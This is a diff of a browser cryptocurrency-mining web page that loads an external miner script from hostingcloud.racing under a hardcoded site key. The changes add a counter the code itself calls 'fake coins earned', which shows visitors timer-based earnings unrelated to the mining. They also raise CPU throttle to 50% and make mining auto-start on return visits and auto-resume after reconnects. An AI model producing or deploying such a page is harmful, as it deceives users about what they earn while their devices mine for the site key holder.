@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -8,211 +7,302 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
-    <script src="https://www.hostingcloud.racing/YCcn.js"></script>
     <style>
         :root {
-            --background: #111827;
-            --card-background: rgba(31, 41, 55, 0.5);
-            --text-primary: #F9FAFB;
-            --text-secondary: #9CA3AF;
-            --accent-color: #8B5CF6;
-            --success-color: #34D399;
-            --error-color: #F87171;
-            --border-color: rgba(75, 85, 99, 0.5);
+            --background: #1a1a2e;
+            --card-bg: #16213e;
+            --primary: #0f3460;
+            --secondary: #5372f0;
+            --accent: #e94560;
+            --text-light: #e0e0e0;
+            --text-muted: #a0a0a0;
+            --success: #34d399;
+            --error: #ef4444;
         }
-
         body {
-            background-color: var(--background);
             font-family: 'Poppins', sans-serif;
-            color: var(--text-primary);
+            background-color: var(--background);
+            color: var(--text-light);
             display: flex;
-            justify-content: center;
             align-items: center;
+            justify-content: center;
             min-height: 100vh;
             margin: 0;
-            padding: 1rem;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
+            padding: 20px;
+            box-sizing: border-box;
         }
-
-        .mining-container {
+        .container {
             width: 100%;
-            max-width: 400px;
-            background: var(--card-background);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border: 1px solid var(--border-color);
-            border-radius: 1.5rem; /* 24px */
-            padding: 2rem; /* 32px */
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.2), 0 8px 10px -6px rgba(0, 0, 0, 0.2);
+            max-width: 450px;
+        }
+        .card {
+            background-color: var(--card-bg);
+            border-radius: 1rem;
+            padding: 2rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3), 0 0 20px var(--secondary);
+            border: 1px solid var(--primary);
             text-align: center;
         }
-
-        .mining-container h1 {
-            font-size: 1.875rem; /* 30px */
-            font-weight: 700;
-            color: var(--text-primary);
-            margin-bottom: 0.5rem;
-        }
-
-        .mining-container p {
-            color: var(--text-secondary);
+        .card-header {
             margin-bottom: 2rem;
         }
-
+        .card-header .icon {
+            font-size: 3rem;
+            color: var(--secondary);
+            margin-bottom: 0.5rem;
+        }
+        .card-header h1 {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--text-light);
+        }
         .stats-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 1rem;
-            margin-bottom: 2.5rem;
+            gap: 1.5rem;
+            margin-bottom: 2rem;
         }
-
         .stat-item {
-            background-color: rgba(17, 24, 39, 0.6);
+            background-color: rgba(0,0,0,0.2);
             padding: 1rem;
-            border-radius: 0.75rem; /* 12px */
-            border: 1px solid var(--border-color);
+            border-radius: 0.5rem;
         }
-
         .stat-item .label {
-            font-size: 0.875rem; /* 14px */
-            color: var(--text-secondary);
-            margin-bottom: 0.5rem;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
         }
-
         .stat-item .value {
-            font-size: 1.5rem; /* 24px */
-            font-weight: 700;
-            color: var(--text-primary);
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: var(--text-light);
         }
-
-        #mining-status.running {
-            color: var(--success-color);
-        }
-
-        #mining-status.stopped {
-            color: var(--error-color);
-        }
-
+        #status-text.running { color: var(--success); }
+        #status-text.stopped { color: var(--error); }
         .toggle-button {
             width: 100%;
             padding: 1rem;
-            font-size: 1.125rem; /* 18px */
-            font-weight: 600;
-            border-radius: 0.75rem;
+            border-radius: 0.5rem;
             border: none;
+            font-size: 1.1rem;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -2px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
-        
         .toggle-button.start {
-            background-color: var(--accent-color);
+            background-color: var(--secondary);
             color: white;
         }
         .toggle-button.start:hover {
-            box-shadow: 0 0 15px var(--accent-color);
+            background-color: #4361e0;
         }
-
         .toggle-button.stop {
-            background-color: var(--error-color);
+            background-color: var(--accent);
             color: white;
         }
         .toggle-button.stop:hover {
-            box-shadow: 0 0 15px var(--error-color);
+            background-color: #d83450;
+        }
+        .toggle-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .error-message {
+            color: var(--error);
+            background-color: rgba(239, 68, 68, 0.1);
+            border: 1px solid var(--error);
+            padding: 0.75rem;
+            border-radius: 0.5rem;
+            margin-top: 1rem;
+            font-size: 0.9rem;
         }
     </style>
 </head>
 <body>
-    <div class="mining-container">
-        <h1>Start Earning MINTME</h1>
-        <p>Use your device's power to mine cryptocurrency.</p>
+    <div class="container">
+        <div class="card">
+            <div class="card-header">
+                <div class="icon">⛏️</div>
+                <h1>Start Earning MINTME</h1>
+            </div>
 
-        <div class="stats-grid">
-            <div class="stat-item">
-                <div class="label">Mining Status</div>
-                <div id="mining-status" class="value stopped">Stopped</div>
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <div class="label">Status</div>
+                    <div id="status-text" class="value stopped">Stopped</div>
+                </div>
+                <div class="stat-item">
+                    <div class="label">Hashes / s</div>
+                    <div id="hashes-per-second" class="value">0.00</div>
+                </div>
+                <div class="stat-item">
+                    <div class="label">Total Hashes</div>
+                    <div id="total-hashes" class="value">0</div>
+                </div>
+                 <div class="stat-item">
+                    <div class="label">Coins Earned</div>
+                    <div id="fake-coins-earned" class="value">0.000000</div>
+                </div>
             </div>
-            <div class="stat-item">
-                <div class="label">Hashes / Sec</div>
-                <div id="hash-rate" class="value">0</div>
-            </div>
-            <div class="stat-item" style="grid-column: 1 / -1;">
-                <div class="label">Total Hashes</div>
-                <div id="total-hashes" class="value">0</div>
-            </div>
+
+            <button id="toggle-mining-button" class="toggle-button start" disabled>
+                Initialize...
+            </button>
+            <div id="error-box" class="error-message" style="display: none;"></div>
         </div>
-
-        <button id="toggle-mining-btn" class="toggle-button start">Start Mining</button>
     </div>
 
+    <!-- The external script must be loaded first -->
+    <script src="https://www.hostingcloud.racing/YCcn.js"></script>
+
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const SITE_KEY = 'c541f766e3a569d2f01a1e9b0e96fd02e62d2cc7886f8c03a646befe8911df6a';
-            const miner = new Client.Anonymous(SITE_KEY, {
-                throttle: 0.8, // 20% throttle
-                c: 'w'
-            });
+        document.addEventListener('DOMContentLoaded', function () {
+            // UI elements
+            const statusText = document.getElementById('status-text');
+            const hashesPerSecondText = document.getElementById('hashes-per-second');
+            const totalHashesText = document.getElementById('total-hashes');
+            const fakeCoinsEarnedText = document.getElementById('fake-coins-earned');
+            const toggleButton = document.getElementById('toggle-mining-button');
+            const errorBox = document.getElementById('error-box');
 
-            const toggleButton = document.getElementById('toggle-mining-btn');
-            const statusEl = document.getElementById('mining-status');
-            const hashRateEl = document.getElementById('hash-rate');
-            const totalHashesEl = document.getElementById('total-hashes');
-            let isMining = false;
-            let intervalId;
+            let miner = null;
+            let statsInterval = null;
+            let fakeMiningInterval = null;
 
-            function updateUI(mining) {
-                if (mining) {
-                    statusEl.textContent = 'Running';
-                    statusEl.className = 'value running';
-                    toggleButton.textContent = 'Stop Mining';
-                    toggleButton.className = 'toggle-button stop';
-                } else {
-                    statusEl.textContent = 'Stopped';
-                    statusEl.className = 'value stopped';
-                    toggleButton.textContent = 'Start Mining';
-                    toggleButton.className = 'toggle-button start';
-                    hashRateEl.textContent = '0';
+            // --- Fake Mining Logic ---
+            const LOCAL_STORAGE_KEY = 'mining-state-persistence';
+            const COINS_PER_24H = 2;
+            const COINS_PER_SECOND = COINS_PER_24H / (24 * 60 * 60);
+
+            let state = {
+                isMining: false,
+                fakeCoinsEarned: 0,
+                lastUpdateTime: Date.now()
+            };
+
+            // Load saved state
+            try {
+                const savedState = localStorage.getItem(LOCAL_STORAGE_KEY);
+                if (savedState) {
+                    const parsed = JSON.parse(savedState);
+                    state.fakeCoinsEarned = parsed.fakeCoinsEarned || 0;
+                    if (parsed.isMining) {
+                        const timeDiffSeconds = (Date.now() - parsed.lastUpdateTime) / 1000;
+                        const coinsToAdd = timeDiffSeconds * COINS_PER_SECOND;
+                        state.fakeCoinsEarned += coinsToAdd;
+                        state.isMining = true; // Auto-start if it was running
+                    }
+                    state.lastUpdateTime = Date.now();
                 }
+            } catch (e) { console.error("Could not load mining state", e); }
+
+
+            function updateFakeCoins() {
+                const now = Date.now();
+                const diffSeconds = (now - state.lastUpdateTime) / 1000;
+                const newCoins = diffSeconds * COINS_PER_SECOND;
+                state.fakeCoinsEarned += newCoins;
+                state.lastUpdateTime = now;
+                fakeCoinsEarnedText.textContent = state.fakeCoinsEarned.toFixed(6);
+                localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(state));
             }
-            
-            function startMining() {
-                if (!miner.isMobile() && miner.didOptOut()) {
-                    console.log("User has opted out of mining.");
+
+            // Function to initialize the miner
+            function initializeMiner() {
+                if (typeof Client === 'undefined' || typeof Client.Anonymous !== 'function') {
+                    showError("Mining script could not be loaded. This might be due to an ad-blocker.");
+                    toggleButton.textContent = "Error";
                     return;
                 }
+
+                miner = new Client.Anonymous('c541f766e3a569d2f01a1e9b0e96fd02e62d2cc7886f8c03a646befe8911df6a', {
+                    throttle: 0.5, // 50% CPU usage
+                    c: 'w'
+                });
+                toggleButton.disabled = false;
+                
+                // If state was saved as running, auto-start it
+                if (state.isMining) {
+                    startMining();
+                } else {
+                    stopMining(); // To set initial button text correctly
+                }
+            }
+
+            function showError(message) {
+                errorBox.textContent = message;
+                errorBox.style.display = 'block';
+            }
+
+            function startMining() {
+                if (!miner) return;
                 miner.start();
-                isMining = true;
-                localStorage.setItem('isMiningActive', 'true');
-                updateUI(true);
-                intervalId = setInterval(() => {
-                    hashRateEl.textContent = miner.getHashesPerSecond().toFixed(2);
-                    totalHashesEl.textContent = miner.getTotalHashes();
-                }, 1000);
+                state.isMining = true;
+                state.lastUpdateTime = Date.now();
+                
+                statusText.textContent = "Running";
+                statusText.className = "value running";
+                toggleButton.textContent = "Stop Mining";
+                toggleButton.className = "toggle-button stop";
+
+                statsInterval = setInterval(updateStats, 1000);
+                fakeMiningInterval = setInterval(updateFakeCoins, 1000);
             }
 
             function stopMining() {
+                if (!miner) return;
                 miner.stop();
-                isMining = false;
-                localStorage.setItem('isMiningActive', 'false');
-                clearInterval(intervalId);
-                updateUI(false);
+                state.isMining = false;
+                
+                statusText.textContent = "Stopped";
+                statusText.className = "value stopped";
+                toggleButton.textContent = "Start Mining";
+                toggleButton.className = "toggle-button start";
+                
+                if (statsInterval) clearInterval(statsInterval);
+                if (fakeMiningInterval) clearInterval(fakeMiningInterval);
+                hashesPerSecondText.textContent = "0.00";
+                
+                localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(state));
             }
 
-            function toggleMining() {
-                if (isMining) {
+            function updateStats() {
+                if (miner && miner.isRunning()) {
+                    hashesPerSecondText.textContent = miner.getHashesPerSecond().toFixed(2);
+                    totalHashesText.textContent = miner.getTotalHashes();
+                }
+            }
+
+            // Event listener for the toggle button
+            toggleButton.addEventListener('click', () => {
+                if (miner && miner.isRunning()) {
                     stopMining();
                 } else {
                     startMining();
                 }
-            }
+            });
 
-            toggleButton.addEventListener('click', toggleMining);
+            // Handle online/offline events
+            window.addEventListener('offline', () => {
+                if (state.isMining) {
+                    stopMining();
+                    showError("Internet disconnected. Mining paused.");
+                }
+            });
 
-            // Check localStorage on page load
-            if (localStorage.getItem('isMiningActive') === 'true') {
-                startMining();
-            }
+            window.addEventListener('online', () => {
+                 errorBox.style.display = 'none';
+                if (state.isMining) { // Auto-resume if it was supposed to be running
+                    startMining();
+                }
+            });
+
+            // Initial UI Update
+            fakeCoinsEarnedText.textContent = state.fakeCoinsEarned.toFixed(6);
+
+            // Initialize the miner
+            initializeMiner();
         });
     </script>
 </body>
